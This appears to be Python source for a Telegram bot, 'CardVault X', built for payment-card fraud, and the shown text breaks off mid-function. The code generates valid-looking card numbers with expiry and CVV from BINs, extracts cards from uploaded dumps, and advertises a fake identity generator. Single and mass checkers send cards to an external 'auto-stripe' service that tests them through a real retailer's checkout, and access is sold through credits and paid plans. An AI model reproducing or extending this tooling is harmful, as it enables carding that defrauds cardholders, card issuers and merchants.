        f"{bullet_link} `/seturl \\<site url\\>` – Set your Shopify site\n"
        f"{bullet_link} `/remove` – Remove your saved Shopify site\n"
        f"{bullet_link} `/sp` – Auto check on your saved Shopify site\n"
        f"{bullet_link} `/site \\<url\\>` – Check if Shopify site is live\n\n"

        "🔹 *𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙤𝙧𝙨*\n"
        f"{bullet_link} `/gen [bin] [no\\. of cards]` – Generate cards from BIN\n"
        f"{bullet_link} `/bin \\<bin\\>` – BIN lookup \\(Bank, Country, Type\\)\n"
        f"{bullet_link} `/fk \\<country\\>` – Fake identity generator\n"
        f"{bullet_link} `/fl \\<dump\\>` – Extract CCs from dumps\n"
        f"{bullet_link} `/open` – Extract cards from uploaded file\n\n"

        "🔹 *𝙎𝙮𝙨𝙩𝙚𝙢 ＆ 𝙐𝙨𝙚𝙧*\n"
        f"{bullet_link} `/start` – Welcome message\n"
        f"{bullet_link} `/cmds` – Show all commands\n"
        f"{bullet_link} `/status` – Bot system status\n"
        f"{bullet_link} `/credits` – Check your remaining credits\n"
        f"{bullet_link} `/info` – Show your user info\n"
    )

    await update.effective_message.reply_text(
        cmds_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )




from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/CARDER33"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the user's detailed information."""
    user = update.effective_user
    user_data = await get_user(user.id)
    
    # Define the bullet point with the hyperlink
    bullet_text = escape_all_markdown("[⌇]")
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    # Escape all dynamic values
    first_name = escape_markdown_v2(user.first_name or 'N/A')
    user_id = escape_markdown_v2(str(user.id))
    username = escape_markdown_v2(user.username or 'N/A')
    status = escape_markdown_v2(user_data.get('status', 'N/A'))
    credits = escape_markdown_v2(str(user_data.get('credits', 0)))
    plan = escape_markdown_v2(user_data.get('plan', 'N/A'))
    plan_expiry = escape_markdown_v2(user_data.get('plan_expiry', 'N/A'))
    keys_redeemed = escape_markdown_v2(str(user_data.get('keys_redeemed', 0)))
    registered_at = escape_markdown_v2(user_data.get('registered_at', 'N/A'))

    info_message = (
        "🔍 *Your Info on 𝑪𝒂𝒓𝒅𝑽𝒂𝒖𝒍𝒕✘* ⚡\n"
        "━━━━━━━━━━━━━━\n"
        f"{bullet_link}  𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚: `{first_name}`\n"
        f"{bullet_link}  𝙄𝘿: `{user_id}`\n"
        f"{bullet_link}  𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{username}\n\n"
        f"{bullet_link}  𝙎𝙩𝙖𝙩𝙪𝙨: `{status}`\n"
        f"{bullet_link}  𝘾𝙧𝙚𝙙𝙞𝙩: `{credits}`\n"
        f"{bullet_link}  𝙋𝙡𝙖𝙣: `{plan}`\n"
        f"{bullet_link}  𝙋𝙡𝙖𝙣 𝙀𝙭𝙥𝙞𝙧𝙮: `{plan_expiry}`\n"
        f"{bullet_link}  𝙆𝙚𝙮𝙨 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙: `{keys_redeemed}`\n"
        f"{bullet_link}  𝙍𝙚𝙜𝙞𝙨𝙩𝙚𝙧𝙚𝙙 𝘼𝙩: `{registered_at}`\n"
    )

    await update.message.reply_text(
        info_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )




from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.helpers import escape_markdown as escape_markdown_v2
import random, io
from datetime import datetime
from bin import get_bin_info  # Your BIN lookup function

# ===== /gen Command =====
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates cards from a given BIN/sequence."""
    
    user = update.effective_user
    
    # Enforce cooldown (assuming function defined)
    if not await enforce_cooldown(user.id, update):
        return
    
    # Get user data and check credits
    user_data = await get_user(user.id)
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Get input
    if context.args:
        raw_input = context.args[0]
    else:
        raw_input = None
    
    if not raw_input:
        return await update.effective_message.reply_text(
            escape_markdown_v2(
                "❌ Please provide BIN or sequence (at least 6 digits).\n"
                "Usage:\n`/gen 414740`\n`/gen 445769 20`\n`/gen 414740|11|2028|777`"
            ),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Split input parts
    parts = raw_input.split("|")
    card_base = parts[0].strip()
    extra_mm = parts[1].zfill(2) if len(parts) > 1 and parts[1].isdigit() else None
    extra_yyyy = parts[2] if len(parts) > 2 and parts[2].isdigit() else None
    extra_cvv = parts[3] if len(parts) > 3 and parts[3].isdigit() else None
    
    if not card_base.isdigit() or len(card_base) < 6:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ BIN/sequence must be at least 6 digits."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Determine number of cards
    num_cards = 10  # default
    send_as_file = False
    if len(context.args) > 1 and context.args[1].isdigit():
        num_cards = int(context.args[1])
        send_as_file = True
    
    # Consume 1 credit
    if not await consume_credit(user.id):
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # ==== Fetch BIN info ====
    try:
        bin_number = card_base[:6]
        bin_details = await get_bin_info(bin_number)

        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "N/A"
        country_flag = bin_details.get("country_emoji", "")
        card_type = bin_details.get("type", "N/A")
        card_level = bin_details.get("level", "N/A")
        card_length = bin_details.get("length") or (15 if "amex" in brand.lower() else 16)
        luhn_check = "✅" if bin_details.get("luhn", True) else "❌"
        bank_phone = bin_details.get("bank_phone", "N/A")
        bank_url = bin_details.get("bank_url", "N/A")
    except Exception:
        brand = issuer = country_name = country_flag = card_type = card_level = bank_phone = bank_url = "N/A"
        card_length = 16
        luhn_check = "N/A"
    
    # ==== Generate cards ====
    cards = []
    attempts = 0
    max_attempts = num_cards * 100
    while len(cards) < num_cards and attempts < max_attempts:
        attempts += 1
        suffix_len = card_length - len(card_base)
        if suffix_len < 0:
            break
        
        card_number = card_base + ''.join(str(random.randint(0, 9)) for _ in range(suffix_len))
        if not luhn_checksum(card_number):
            continue
        
        mm = extra_mm or str(random.randint(1, 12)).zfill(2)
        yyyy = extra_yyyy or str(datetime.now().year + random.randint(1, 5))
        cvv = extra_cvv or (str(random.randint(0, 9999)).zfill(4) if card_length == 15 else str(random.randint(0, 999)).zfill(3))
        
        cards.append(f"{card_number}|{mm}|{yyyy[-2:]}|{cvv}")
    
    # ==== BIN info block in grey ====
    escaped_bin_info = (
        "```\n"
        f"BIN       ➳ {escape_markdown_v2(card_base)}\n"
        f"Brand     ➳ {escape_markdown_v2(brand)}\n"
        f"Type      ➳ {escape_markdown_v2(card_type)} | {escape_markdown_v2(card_level)}\n"
        f"Bank      ➳ {escape_markdown_v2(issuer)}\n"
        f"Country   ➳ {escape_markdown_v2(country_name)}\n"
        "```"
    )
    
    # ==== Send output ====
    if send_as_file:
        file_content = "\n".join(cards)
        file = io.BytesIO(file_content.encode('utf-8'))
        file.name = f"generated_cards_{card_base}.txt"
        await update.effective_message.reply_document(
            document=file,
            caption=f"```\nGenerated {len(cards)} cards 💳\n```\n\n{escaped_bin_info}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        cards_list = "\n".join(f"`{c}`" for c in cards)
        final_message = (
            f"```\nGenerated {len(cards)} cards 💳\n```\n\n"
            f"{cards_list}\n\n"
            f"{escaped_bin_info}"
        )
        await update.effective_message.reply_text(
            final_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )








import re
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import io
from telegram.helpers import escape_markdown as escape_markdown_v2

# These are placeholder functions. You will need to define the actual
# logic for them elsewhere in your codebase.
async def get_user(user_id):
    """Placeholder function to retrieve user data, e.g., from a database."""
    # Returning dummy data for the purpose of a runnable example.
    return {
        'status': 'Active',
        'credits': 100,
        'plan': 'Free Tier',
        'plan_expiry': 'N/A',
        'keys_redeemed': 2,
        'registered_at': '2025-01-01'
    }

async def update_user(user_id, **kwargs):
    """Placeholder function to update user data, e.g., deducting credits."""
    print(f"User {user_id} updated with {kwargs}")
    return True

async def enforce_cooldown(user_id, update):
    """Placeholder function to enforce command cooldowns."""
    # You can implement your cooldown logic here.
    # For now, we will return True to allow the command to proceed.
    return True

async def open_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Extracts credit cards from an uploaded text file, or from a file
    in a replied-to message, with a maximum limit of 100 cards.
    A single credit is deducted per command use.
    """
    # The authorization check has been removed, so all users can access this command.

    user = update.effective_user
    if not await enforce_cooldown(user.id, update):
        return

    # Fetch user data to check credits
    user_data = await get_user(user.id)
    # Check for at least 1 credit to run the command
    if not user_data or user_data.get('credits', 0) <= 0:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check for a replied-to message with a document
    if update.effective_message.reply_to_message and update.effective_message.reply_to_message.document:
        document = update.effective_message.reply_to_message.document
    # Fallback to checking the current message for a document
    elif update.effective_message.document:
        document = update.effective_message.document
    else:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Please reply to a txt file with the command or attach a txt file with the command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check if the file is a text file
    if document.mime_type != 'text/plain':
        return await update.effective_message.reply_text(escape_markdown_v2("❌ The file must be a text file (.txt)."), parse_mode=ParseMode.MARKDOWN_V2)

    # Deduct a single credit for the command
    await update_user(user.id, credits=user_data['credits'] - 1)

    # Get the file and download its content
    try:
        file_obj = await document.get_file()
        file_content_bytes = await file_obj.download_as_bytearray()
        file_content = file_content_bytes.decode('utf-8')
    except Exception as e:
        return await update.effective_message.reply_text(escape_markdown_v2(f"❌ An error occurred while reading the file: {e}"), parse_mode=ParseMode.MARKDOWN_V2)

    # Regex to find credit card patterns
    card_pattern = re.compile(r'(\d{13,16}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    
    # Find all matches
    found_cards = card_pattern.findall(file_content)
    
    # Check if the number of cards exceeds the 100 limit
    if len(found_cards) > 100:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ The maximum number of cards allowed to open is 100. Please upload a smaller file."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not found_cards:
        return await update.effective_message.reply_text(escape_markdown_v2("❌ No valid cards were found in the file."), parse_mode=ParseMode.MARKDOWN_V2)

    # Format the output message with count and monospace
    cards_list = "\n".join([f"`{card}`" for card in found_cards])
    
    # Create the stylish box for the caption/message
    stylish_card_box = (
        f"💳 𝐂𝐀𝐑𝐃𝐕𝐀𝐔𝐋𝐓 𝐗 💳\n\n"
        f"╭━━━━━━━━━━━━━━━━━━⬣\n"
        f"┣ ❏ 𝐅𝐨𝐮𝐧𝐝 *{len(found_cards)}* 𝐂𝐚𝐫𝐝𝐬\n"
        f"╰━━━━━━━━━━━━━━━━━━⬣\n"
    )
    
    # Combine the box and the list of cards
    final_message = f"{stylish_card_box}\n{cards_list}"
    
    # Check if the message is too long to be sent normally
    # A safe limit, as Telegram's is 4096
    if len(final_message) > 4000:
        file_content = "\n".join(found_cards)
        file = io.BytesIO(file_content.encode('utf-8'))
        file.name = f"extracted_cards.txt"
        
        await update.effective_message.reply_document(
            document=file,
            caption=f"{stylish_card_box}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        await update.effective_message.reply_text(
            final_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )


import re
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import io
from telegram.helpers import escape_markdown as escape_markdown_v2

async def adcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Adds a specified number of credits to a user's account, restricted to a specific owner."""
    # Owner ID is hardcoded
    OWNER_ID = 8493360284

    # Check if the user is the owner
    if update.effective_user.id != OWNER_ID:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You are not allowed to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check for correct number of arguments
    if len(context.args) != 2:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Invalid command usage. Correct usage: /adcr [user_id] [no. of credits]"),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])
        credits_to_add = int(context.args[1])

        if credits_to_add <= 0:
            return await update.effective_message.reply_text(
                escape_markdown_v2("❌ The number of credits must be a positive integer."),
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Both the user ID and number of credits must be valid numbers."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Fetch the target user's data
    target_user_data = await get_user(user_id)

    if not target_user_data:
        return await update.effective_message.reply_text(
            escape_markdown_v2(f"❌ User with ID {user_id} not found in the database."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Update the user's credits
    new_credits = target_user_data.get('credits', 0) + credits_to_add
    await update_user(user_id, credits=new_credits)

    # Send a confirmation message with proper monospace formatting and escaping
    # The f-string is escaped here to handle the periods correctly.
    final_message = escape_markdown_v2(f"✅ Successfully added {credits_to_add} credits to user {user_id}. Their new credit balance is {new_credits}.")

    await update.effective_message.reply_text(
        final_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )


from telegram import Update
from telegram.ext import ContextTypes
from bin import get_bin_info  # Import your BIN fetching logic
import html

# ===== Config =====
BULLET_GROUP_LINK = "https://t.me/CARDER33"
DEVELOPER_NAME = "kคli liຖนxx"
DEVELOPER_LINK = "https://t.me/Kalinuxxx"

# ===== Utilities =====
def get_level_emoji(level: str) -> str:
    """Return a matching emoji for card level/category."""
    mapping = {
        "classic": "💳",
        "gold": "🥇",
        "platinum": "💠",
        "business": "🏢",
        "world": "🌍",
        "signature": "✍️",
        "infinite": "♾️"
    }
    return mapping.get(level.lower(), "💳")


def safe(field):
    """Return field or 'N/A' if None."""
    return field or "N/A"


# ===== /bin Command =====
async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Performs a BIN lookup and shows full info using clickable bullets."""
    user = update.effective_user

    # Clickable bullet
    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
    developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

    # Parse BIN input
    bin_input = None
    if context.args:
        bin_input = context.args[0]
    elif update.effective_message and update.effective_message.text:
        parts = update.effective_message.text.split(maxsplit=1)
        if len(parts) > 1:
            bin_input = parts[1]

    if not bin_input or not bin_input.isdigit() or len(bin_input) < 6:
        return await update.effective_message.reply_text(
            "❌ Please provide a valid 6-digit BIN. Usage: /bin [bin]",
            parse_mode="HTML"
        )

    bin_number = bin_input[:6]

    try:
        # Fetch BIN info
        bin_details = await get_bin_info(bin_number)

        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = safe(bin_details.get("bank"))
        country_name = safe(bin_details.get("country"))
        country_flag = bin_details.get("country_emoji", "")
        card_type = safe(bin_details.get("type"))
        card_level = safe(bin_details.get("brand"))
        card_length = safe(bin_details.get("length"))
        luhn_check = safe(bin_details.get("luhn"))
        bank_phone = safe(bin_details.get("bank_phone"))
        bank_url = safe(bin_details.get("bank_url"))

        level_emoji = get_level_emoji(card_level)

        # Build BIN info message
        bin_info_box = (
            f"✦━━━[ <b>𝐁𝐈𝐍 𝐈𝐍𝐅𝐎</b> ]━━━✦\n"
            f"{bullet_link} <b>BIN</b> ➳ <code>{bin_number}</code>\n"
            f"{bullet_link} <b>Scheme</b> ➳ <code>{html.escape(brand)}</code>\n"
            f"{bullet_link} <b>Type</b> ➳ <code>{html.escape(card_type)}</code>\n"
            f"{bullet_link} <b>Brand</b> ➳ {level_emoji} <code>{html.escape(card_level)}</code>\n"
            f"{bullet_link} <b>Issuer/Bank</b> ➳ <code>{html.escape(issuer)}</code>\n"
            f"{bullet_link} <b>Country</b> ➳ <code>{html.escape(country_name)} {country_flag}</code>\n"
            f"{bullet_link} <b>Requested By</b> ➳ {user.mention_html()}\n"
            f"{bullet_link} <b>Bot By</b> ➳ {developer_clickable}\n"
        )

        # Send BIN info
        await update.effective_message.reply_text(
            bin_info_box,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ Error fetching BIN info: {html.escape(str(e))}",
            parse_mode="HTML"
        )










from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/CARDER33"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /credits command, showing user info and credits."""
    user = update.effective_user
    user_data = await get_user(user.id)
    
    # Define the bullet point with the hyperlink
    bullet_text = escape_all_markdown("[⌇]")
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    credits = str(user_data.get('credits', 0))
    plan = user_data.get('plan', 'N/A')

    # Escape user inputs
    escaped_username = escape_markdown_v2(user.username or 'N/A')
    escaped_user_id = escape_markdown_v2(str(user.id))
    escaped_plan = escape_markdown_v2(plan)
    escaped_credits = escape_markdown_v2(credits)

    credit_message = (
        f"💳 *Your Credit Info* 💳\n"
        f"✦━━━━━━━━━━━━━━✦\n"
        f"{bullet_link} Username: @{escaped_username}\n"
        f"{bullet_link} User ID: `{escaped_user_id}`\n"
        f"{bullet_link} Plan: `{escaped_plan}`\n"
        f"{bullet_link} Credits: `{escaped_credits}`\n"
    )

    await update.effective_message.reply_text(
        credit_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )





import time
import asyncio
import aiohttp
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes
from bin import get_bin_info   # ✅ use the correct function
import re
import logging

# Import your database functions here
from db import get_user, update_user

logger = logging.getLogger(__name__)

# Global variable for user cooldowns
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Enforces a cooldown period for a user to prevent spamming."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


# ===== BACKGROUND CHECK =====
import aiohttp
import re
from telegram.constants import ParseMode

# Function to escape special characters for MarkdownV2
def escape_md(text: str) -> str:
    return re.sub(r'([_\*\[\]\(\)\~\>\#\+\-\=\|\{\}\.\!])', r'\\\1', text)

async def background_check(cc_normalized, parts, user, user_data, processing_msg):
    # Prepare clickable bullet with square brackets visible
    bullet_text = "[⌇]"
    bullet_link_url = "https://t.me/CARDER33"  # replace with your actual link
    bullet_link = f"[{escape_md(bullet_text)}]({bullet_link_url})"

    try:
        # BIN lookup
        bin_number = parts[0][:6]
        bin_details = await get_bin_info(bin_number)

        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "N/A"
        country_flag = bin_details.get("country_emoji", "")
        card_type = bin_details.get("type", "N/A")
        card_level = bin_details.get("brand", "N/A")
        card_length = bin_details.get("length", "N/A")
        luhn_check = bin_details.get("luhn", "N/A")
        bank_phone = bin_details.get("bank_phone", "N/A")
        bank_url = bin_details.get("bank_url", "N/A")

        # Call main API
        api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=45) as resp:
                if resp.status != 200:
                    raise Exception(f"HTTP {resp.status}")
                data = await resp.json()

        api_status = (data.get("status") or "Unknown").strip()

        # Status formatting
        lower_status = api_status.lower()
        if "approved" in lower_status:
            status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
        elif "declined" in lower_status:
            status_text = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
        elif "ccn live" in lower_status:
            status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
        elif "incorrect" in lower_status or "your number" in lower_status:
            status_text = "❌ 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 ❌"
        elif "3ds" in lower_status or "auth required" in lower_status:
            status_text = "🔒 3𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 🔒"
        elif "insufficient funds" in lower_status:
            status_text = "💸 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 💸"
        elif "expired" in lower_status:
            status_text = "⌛ 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ⌛"
        elif "stolen" in lower_status:
            status_text = "🚫 𝗦𝗧𝗢𝗟𝗘𝗡 𝗖𝗔𝗥𝗗 🚫"
        elif "pickup card" in lower_status:
            status_text = "🛑 𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 🛑"
        elif "fraudulent" in lower_status:
            status_text = "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
        elif "generic decline" in lower_status:
            status_text = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
        else:
            status_text = api_status.upper()

        # Header + response
        header = f"═══ [ *{escape_md(status_text)}* ] ═══"
        formatted_response = f"_{escape_md(api_status)}_"

        # Build final message with [⌇] bullets
        final_text = (
            f"{header}\n"
            f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ `{escape_md(cc_normalized)}`\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {formatted_response}\n"
            f"――――――――――――――――\n"
            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ `{escape_md(brand)}`\n"
            f"{bullet_link} 𝐓𝐲𝐩𝐞 ➜ `{escape_md(card_type)} | {escape_md(card_level)}`\n"
            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ `{escape_md(issuer)}`\n"
            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ `{escape_md(country_name)} {escape_md(country_flag)}`\n"
            f"――――――――――――――――\n"
            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ [{escape_md(user.first_name)}](tg://user?id={user.id})\n"
            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ [kคli liຖนxx](tg://resolve?domain=Kalinuxxx)\n"
            f"――――――――――――――――"
        )

        # Send final message
        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ An error occurred: {escape_md(str(e))}",
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )






import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

CARD_PATTERN = re.compile(r"\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b")

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text("❌ Could not fetch your user data.")
        return

    # Check credits
    if user_data.get("credits", 0) <= 0:
        await update.effective_message.reply_text("❌ You have no credits left.")
        return

    # Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    card_input = None

    # 1️⃣ Command argument takes priority
    if context.args and len(context.args) > 0:
        raw_text = " ".join(context.args)
        match = CARD_PATTERN.search(raw_text)
        if match:
            card_input = match.group(0)

    # 2️⃣ Else check replied message
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = CARD_PATTERN.search(update.message.reply_to_message.text)
        if match:
            card_input = match.group(0)

    if not card_input:
        await update.message.reply_text(
            "🚫 Usage: /chk <card|mm|yy|cvv> or reply to a message containing a card."
        )
        return

    # Normalize month and year
    parts = card_input.split("|")
    card, mm, yy, cvv = parts
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[-2:]
    parts = [card, mm, yy, cvv]
    cc_normalized = "|".join(parts)

    # Deduct credit
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ No credits left.")
        return

    # Bullet link
    bullet_text = escape_markdown_v2("[⌇]")
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    # Processing message
    processing_text = (
        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
        f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
        f"{bullet_link} Gateway ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
        f"{bullet_link} Status ➜ Checking🔎\\.\\.\\.\n"
        "════════════════════"
    )

    status_msg = await update.effective_message.reply_text(
        processing_text,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True,
    )

    # Run background check
    asyncio.create_task(
        background_check(cc_normalized, parts, user, user_data, status_msg)
    )










import asyncio
import aiohttp
import time
import re
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.error import TelegramError
from db import get_user, update_user  # your async DB functions




# --- PLAN VALIDATION ---
async def has_active_paid_plan(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if not user_data:
        return False

    plan = str(user_data.get("plan", "Free"))
    expiry = user_data.get("plan_expiry", "N/A")

    if plan.lower() == "free":
        return False

    if expiry != "N/A":
        try:
            expiry_date = datetime.strptime(expiry, "%d-%m-%Y")
            if expiry_date < datetime.now():
                return False
        except Exception:
            return False
    return True

async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    chat_type = update.effective_chat.type

    if user_id == OWNER_ID:
        return True

    if not await has_active_paid_plan(user_id):
        await update.effective_message.reply_text(
            "🚫 You need an *active paid plan* to use this command.\n💳 or use for free in our group."
        )
        return False
    return True
    

async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            new_credits = user_data["credits"] - 1
            await update_user(user_id, credits=new_credits)
            return True
    except Exception as e:
        print(f"[consume_credit] Error updating user {user_id}: {e}")
    return False

# API and concurrency settings
API_URL_TEMPLATE = "https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
CONCURRENCY = 3
UPDATE_INTERVAL = 1  # seconds
RATE_LIMIT_SECONDS = 7
user_last_command_time = {}

def extract_cards_from_text(text: str) -> list[str]:
    """Extracts card-like strings from a given text."""
    return re.findall(r'\d{12,16}[ |]\d{2,4}[ |]\d{2,4}[ |]\d{3,4}', text)

async def check_card(session, card: str):
    """Send card to API and return formatted result and status type."""
    try:
        async with session.get(API_URL_TEMPLATE + card, timeout=50) as resp:
            data = await resp.json()
        status = data.get("status", "Unknown")

        if status.lower() == "approved":
            formatted_status = f"<b><i>{status} ✅</i></b>"
            return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "approved"
        elif status.lower() == "unknown":
            formatted_status = f"<i>{status} 🚫</i>"
            return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "declined"
        else:
            formatted_status = f"<i>{status} ❌</i>"
            return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "declined"
    except (aiohttp.ClientError, asyncio.TimeoutError):
        formatted_status = "<b><i>Error: Network ❌</i></b>"
        return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "error"
    except Exception:
        formatted_status = "<b><i>Error: Unknown ❌</i></b>"
        return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "error"



async def run_mass_check(msg, cards, user_id):
    total = len(cards)
    counters = {"checked": 0, "approved": 0, "declined": 0, "error": 0}
    results = []
    separator = "──────── ⸙ ─────────"
    results_header = "𝗠𝗮𝘀𝐬 𝗖𝗵𝗲𝗰𝗸"
    start_time = time.time()

    queue = asyncio.Queue()
